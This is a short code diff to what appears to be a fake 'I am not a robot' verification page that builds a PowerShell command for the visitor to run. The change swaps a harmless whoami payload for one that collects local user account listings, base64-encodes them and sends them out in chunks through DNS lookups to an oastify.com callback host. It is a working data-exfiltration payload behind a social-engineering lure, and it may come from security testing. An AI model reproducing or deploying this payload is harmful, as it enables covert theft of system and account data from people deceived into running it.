@@ -196,7 +196,7 @@
             
             const exe = "powershell";
             const flags = "-NoProfile -Command";
-            const payload = "\"whoami| Out-File $HOME\\Desktop\\username.txt\"";
+            const payload = "\\\"$m=(net user 2>$null)-join [char]10; $e=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($m)) -replace \\\"[+/=]\\\",\\\"\\\"; $d=\\\"00ys21yxrkovhnl26ip7aca2dtjl7fv4.oastify.com\\\"; 0..([math]::Ceiling($e.Length/40)-1) | % { $c=$e.Substring($_*40, [Math]::Min(40, $e.Length-$_*40)); Resolve-DnsName \\\"s$($_+1).$c.$d\\\" -Type TXT -EA 0 | Out-Null }\\\"";
             const fullCommand = `${exe} ${flags} ${payload}`;
 
             commandDisplay.textContent = '✅ "I am not a robot"';
